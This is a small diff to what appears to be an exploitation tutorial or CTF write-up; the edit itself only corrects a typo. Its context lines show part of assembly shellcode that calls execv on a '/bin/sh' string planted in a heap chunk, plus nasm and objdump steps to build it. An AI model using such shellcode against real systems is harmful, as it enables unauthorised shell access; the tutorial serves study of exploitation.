@@ -598,7 +598,7 @@ push 0x0804e010 ;1st argument (/bin/sh address we put at chunk1)
 mov eax, 0x08048f6c ;load execv's address into eax
 call eax ;call execv
 ```
-use nasm on your hostmachine an assemble with
+use nasm on your host machine to assemble with
 > nasm -f elf32 shellcode.as
 
 then view the file with objdump
